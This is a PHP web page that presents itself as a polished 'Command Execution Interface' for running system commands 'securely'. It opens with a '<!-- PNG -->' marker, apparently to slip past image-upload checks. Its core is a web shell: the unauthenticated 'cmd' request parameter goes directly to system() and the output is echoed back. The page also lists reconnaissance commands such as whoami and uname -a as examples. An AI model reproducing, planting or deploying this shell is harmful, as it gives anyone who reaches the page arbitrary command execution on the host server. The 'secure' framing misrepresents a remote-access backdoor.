<!-- PNG -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution Interface</title>
    <style>
        :root {
            --primary-color: #3498db;
            --secondary-color: #2980b9;
            --dark-color: #2c3e50;
            --light-color: #ecf0f1;
            --success-color: #27ae60;
            --danger-color: #e74c3c;
            --warning-color: #f39c12;
            --border-radius: 8px;
            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            overflow: hidden;
        }

        header {
            background-color: var(--dark-color);
            color: white;
            padding: 20px;
            text-align: center;
        }

        header h1 {
            font-size: 1.8rem;
            margin-bottom: 5px;
        }

        header p {
            opacity: 0.8;
            font-size: 0.9rem;
        }

        .content {
            display: flex;
            flex-direction: column;
            gap: 20px;
            padding: 20px;
        }

        @media (min-width: 768px) {
            .content {
                flex-direction: row;
            }

            .command-section {
                flex: 1;
            }

            .output-section {
                flex: 2;
            }
        }

        .card {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 20px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: var(--dark-color);
        }

        input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: border-color 0.3s, box-shadow 0.3s;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
        }

        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: var(--border-radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: var(--secondary-color);
        }

        .output-container {
            background-color: #1e272e;
            color: #d2dae2;
            border-radius: var(--border-radius);
            padding: 15px;
            min-height: 300px;
            max-height: 500px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .output-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .output-title {
            font-weight: 600;
            color: var(--dark-color);
        }

        .clear-btn {
            background-color: var(--danger-color);
            padding: 6px 12px;
            font-size: 0.8rem;
        }

        .clear-btn:hover {
            background-color: #c0392b;
        }

        .command-history {
            margin-top: 20px;
        }

        .history-title {
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--dark-color);
        }

        .history-list {
            list-style-type: none;
            max-height: 150px;
            overflow-y: auto;
            border: 1px solid #eee;
            border-radius: var(--border-radius);
        }

        .history-item {
            padding: 8px 12px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .history-item:hover {
            background-color: #f8f9fa;
        }

        .history-item:last-child {
            border-bottom: none;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 15px;
            background-color: #f8f9fa;
            border-top: 1px solid #eee;
            font-size: 0.8rem;
            color: #6c757d;
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: var(--success-color);
        }

        footer {
            text-align: center;
            padding: 15px;
            color: #6c757d;
            font-size: 0.8rem;
            border-top: 1px solid #eee;
        }

        .command-examples {
            margin-top: 20px;
        }

        .examples-title {
            font-weight: 600;
            margin-bottom: 10px;
            color: var(--dark-color);
        }

        .example-item {
            padding: 8px 12px;
            background-color: #f8f9fa;
            border-radius: var(--border-radius);
            margin-bottom: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
        }

        .example-item:hover {
            background-color: #e9ecef;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Command Execution Interface</h1>
            <p>Execute system commands securely</p>
        </header>

        <div class="content">
            <section class="command-section">
                <div class="card">
                    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>" id="commandForm">
                        <div class="form-group">
                            <label for="cmd">Enter Command</label>
                            <input type="text" name="cmd" id="cmd" autofocus placeholder="Enter a system command...">
                        </div>
                        <button type="submit">Execute Command</button>
                    </form>

                    <div class="command-examples">
                        <div class="examples-title">Example Commands</div>
                        <div class="example-item" data-command="whoami">whoami</div>
                        <div class="example-item" data-command="pwd">pwd</div>
                        <div class="example-item" data-command="ls -la">ls -la</div>
                        <div class="example-item" data-command="date">date</div>
                        <div class="example-item" data-command="uname -a">uname -a</div>
                    </div>
                </div>

                <div class="command-history card">
                    <div class="history-title">Command History</div>
                    <ul class="history-list" id="historyList">
                        <!-- History items will be added here by JavaScript -->
                    </ul>
                </div>
            </section>

            <section class="output-section">
                <div class="card">
                    <div class="output-header">
                        <div class="output-title">Command Output</div>
                        <button class="clear-btn" id="clearOutput">Clear Output</button>
                    </div>
                    <div class="output-container" id="outputContainer">
                        <?php
                            if(isset($_GET['cmd']))
                            {
                                $command = $_GET['cmd'];
                                echo "> " . htmlspecialchars($command) . "\n\n";
                                system($command . ' 2>&1');
                            }
                            else
                            {
                                echo "No command executed yet. Enter a command above to see the output here.";
                            }
                        ?>
                    </div>
                </div>
            </section>
        </div>

        <div class="status-bar">
            <div class="status-item">
                <div class="status-indicator"></div>
                <span>System Ready</span>
            </div>
            <div class="status-item">
                <span id="currentTime"><?php echo date('Y-m-d H:i:s'); ?></span>
            </div>
        </div>

        <footer>
            <p>Command Execution Interface &copy; <?php echo date('Y'); ?> | Use with caution</p>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cmdInput = document.getElementById('cmd');
            const outputContainer = document.getElementById('outputContainer');
            const clearOutputBtn = document.getElementById('clearOutput');
            const historyList = document.getElementById('historyList');
            const commandForm = document.getElementById('commandForm');
            const exampleItems = document.querySelectorAll('.example-item');
            const currentTimeElement = document.getElementById('currentTime');

            // Load command history from localStorage
            let commandHistory = JSON.parse(localStorage.getItem('commandHistory')) || [];

            // Update command history display
            function updateHistoryDisplay() {
                historyList.innerHTML = '';
                commandHistory.slice().reverse().forEach(cmd => {
                    const li = document.createElement('li');
                    li.className = 'history-item';
                    li.textContent = cmd;
                    li.addEventListener('click', () => {
                        cmdInput.value = cmd;
                        cmdInput.focus();
                    });
                    historyList.appendChild(li);
                });
            }

            // Initialize history display
            updateHistoryDisplay();

            // Update time
            function updateTime() {
                const now = new Date();
                currentTimeElement.textContent = now.toLocaleString();
            }

            setInterval(updateTime, 1000);
            updateTime();

            // Handle form submission
            commandForm.addEventListener('submit', function(e) {
                const command = cmdInput.value.trim();
                if (command) {
                    // Add to history if not already present
                    if (!commandHistory.includes(command)) {
                        commandHistory.push(command);
                        // Keep only last 10 commands
                        if (commandHistory.length > 10) {
                            commandHistory.shift();
                        }
                        localStorage.setItem('commandHistory', JSON.stringify(commandHistory));
                        updateHistoryDisplay();
                    }
                }
                // Form will submit normally
            });

            // Clear output
            clearOutputBtn.addEventListener('click', function() {
                outputContainer.textContent = 'Output cleared.';
            });

            // Example command click handlers
            exampleItems.forEach(item => {
                item.addEventListener('click', function() {
                    const command = this.getAttribute('data-command');
                    cmdInput.value = command;
                    cmdInput.focus();
                });
            });

            // Auto-focus on input
            cmdInput.focus();
        });
    </script>
</body>
</html>
